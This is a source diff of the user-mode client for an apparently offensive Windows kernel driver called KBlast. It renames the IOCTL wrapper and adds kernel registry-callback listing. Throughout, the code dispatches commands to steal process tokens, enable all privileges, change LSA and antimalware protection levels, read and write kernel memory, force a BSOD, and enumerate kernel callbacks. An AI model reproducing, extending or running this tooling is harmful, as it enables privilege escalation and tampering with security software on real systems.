@@ -2,7 +2,7 @@
 
 
 
-BOOL KBlast_c_device_interact(IN DWORD ControlCode, IN OPTIONAL LPVOID pCommandLine, IN OPTIONAL DWORD szIn, OUT OPTIONAL LPVOID outBuffer, IN OPTIONAL DWORD szOutBuffer)
+BOOL KBlast_c_device_control(IN DWORD ControlCode, IN OPTIONAL LPVOID pCommandLine, IN OPTIONAL DWORD szIn, OUT OPTIONAL LPVOID outBuffer, IN OPTIONAL DWORD szOutBuffer)
 {
 	BOOL status = FALSE;
 	HANDLE hDriver = 0;
@@ -38,7 +38,7 @@ BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
 	{
 		if (strcmp(args.arg1, "bsod") == 0)
 		{
-			status = KBlast_c_device_interact(KBLAST_IOCTL_BUG_CHECK, NULL, NULL, NULL, NULL);
+			status = KBlast_c_device_control(KBLAST_IOCTL_BUG_CHECK, NULL, NULL, NULL, NULL);
 		}
 		if (strcmp(args.arg1, "blob") == 0)
 		{
@@ -70,7 +70,7 @@ BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
 						status = KBlast_c_blob_manage(args.arg3, (char*)args.arg4, pBuf, BLOB_WRITE);
 						if (status == TRUE)
 						{
-							status = KBlast_c_device_interact(KBLAST_IOCTL_MEMORY_WRITE, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), NULL, NULL);
+							status = KBlast_c_device_control(KBLAST_IOCTL_MEMORY_WRITE, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), NULL, NULL);
 						}
 						LocalFree(pBuf);
 					}
@@ -90,7 +90,7 @@ BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
 							pOutBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
 							if (pOutBuf != 0)
 							{
-								status = KBlast_c_device_interact(KBLAST_IOCTL_MEMORY_READ, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), (LPVOID)pOutBuf, sizeof(KBLAST_MEMORY_BUFFER));
+								status = KBlast_c_device_control(KBLAST_IOCTL_MEMORY_READ, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), (LPVOID)pOutBuf, sizeof(KBLAST_MEMORY_BUFFER));
 								if (status == TRUE)
 								{
 									pOutBuf->size = pBuf->size;
@@ -131,7 +131,7 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("prot: wintcb protect -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_WINTCB, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_WINTCB, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -141,7 +141,7 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("prot: lsa protect -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_LSA, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_LSA, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -151,7 +151,7 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("prot: antimalware protect -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_ANTIMALWARE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_ANTIMALWARE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -161,7 +161,7 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("prot: none protect -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_PROTECT_NONE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_PROTECT_NONE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -195,7 +195,7 @@ BOOL KBlast_c_device_dispatch_privileges(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("priv: enabling full -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -205,7 +205,7 @@ BOOL KBlast_c_device_dispatch_privileges(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("priv: disabling all -> %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -237,7 +237,7 @@ BOOL KBlast_c_device_dispatch_token(wchar_t* input)
 			if ((DeviceArgs.integer1 != 0) && (DeviceArgs.integer2 != 0))
 			{
 				printf("tokn: steal : %d <- %d (token)\n", DeviceArgs.integer1, DeviceArgs.integer2);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_STEAL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_STEAL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -247,7 +247,7 @@ BOOL KBlast_c_device_dispatch_token(wchar_t* input)
 			if (DeviceArgs.integer1 != 0)
 			{
 				printf("tokn: restore : %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_interact(KBLAST_IOCTL_TOKEN_RESTORE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_RESTORE, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
 				// check result
 			}
 		}
@@ -284,17 +284,22 @@ BOOL KBlast_c_device_dispatch_callbacks(wchar_t* input)
 			{
 				if (strcmp((const char*)((PUCHAR)args.arg1), "process") == 0)
 				{
-					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_PROCESS_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
+					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_PROCESS_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
 					// check result
 				}
 				if (strcmp((const char*)((PUCHAR)args.arg1), "thread") == 0)
 				{
-					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_THREAD_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
+					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_THREAD_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
 					// check result
 				}
 				if (strcmp((const char*)((PUCHAR)args.arg1), "image") == 0)
 				{
-					status = KBlast_c_device_interact(KBLAST_IOCTL_CALLBACK_IMAGE_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
+					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_IMAGE_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
+					// check result
+				}
+				if (strcmp((const char*)((PUCHAR)args.arg1), "registry") == 0)
+				{
+					status = KBlast_c_device_control(KBLAST_IOCTL_CALLBACK_REGISTRY_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_ARRAY));
 					// check result
 				}
 			}
@@ -311,7 +316,14 @@ BOOL KBlast_c_device_dispatch_callbacks(wchar_t* input)
 		{
 			offset = (ULONG)((DWORD_PTR)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer - (DWORD_PTR)pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleBase);
 			name = KBlast_c_utils_GetImageNameByFullPath(pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleFullPathName);
-			printf("[+] Handle : 0x%-016p | Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
+			if (pOutBuffer->CallbackInformation[i].CallbackHandle != 0)
+			{
+				printf("[+] Handle : 0x%-016p | Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
+			}
+			else
+			{
+				printf("[+] Pointer : 0x%-016p ( %s + %lu )\n", (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset);
+			}
 		}
 		offset = 0;
 		name = 0;
